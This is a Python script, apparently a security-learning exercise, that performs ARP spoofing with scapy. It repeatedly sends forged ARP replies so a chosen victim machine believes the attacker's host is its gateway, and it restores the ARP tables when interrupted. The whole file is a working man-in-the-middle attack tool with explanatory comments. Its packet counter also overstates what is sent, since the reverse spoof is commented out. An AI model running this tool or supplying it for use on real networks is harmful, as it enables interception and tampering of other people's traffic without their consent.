#!/usr/bin/env python3

import scapy.all as scapy
import time
import argparse
import sys

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP / Victim IP")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP / Router IP")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target IP, use --help for more info.")
    if not options.gateway:
        parser.error("[-] Please specify a gateway IP, use --help for more info.")
    return options

def get_mac(ip):
    # Create an ARP request asking "Who has this IP?"
    arp_request = scapy.ARP(pdst=ip)
    # Create an Ethernet frame to broadcast the request
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # Combine them
    arp_request_broadcast = broadcast/arp_request
    # Send the packet and wait for a response
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[-] Could not find MAC for {target_ip}. Is the host up?")
        return
        
    # Create the malicious ARP packet
    # op=2 means "ARP Reply" (Is-At)
    # pdst = Packet Destination (Victim)
    # hwdst = Hardware Destination (Victim MAC)
    # psrc = Packet Source (We pretend to be the Gateway IP)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    
    # Send the packet
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    # This function fixes the ARP tables when we quit
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    
    # Send a packet with the REAL MAC address to correct the cache
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    
    # Send it 4 times to ensure it's received
    scapy.send(packet, count=4, verbose=False)

# Main execution
options = get_arguments()
target_ip = options.target
gateway_ip = options.gateway

try:
    print(f"[+] Gathering MAC addresses...")
    sent_packets_count = 0
    while True:
        # Tell the Victim that WE are the Gateway
        spoof(target_ip, gateway_ip)
        # Tell the Gateway that WE are the Victim
        # spoof(gateway_ip, target_ip)
        
        sent_packets_count += 2
        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
        sys.stdout.flush()
        time.sleep(2) # Wait 2 seconds before sending again to avoid flooding

except KeyboardInterrupt:
    print("\n[!] Detected CTRL+C ... Resetting ARP tables... Please wait.\n")
    try:
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[+] Network restored. Exiting.")
    except Exception as e:
        print(f"[-] Error restoring network: {e}")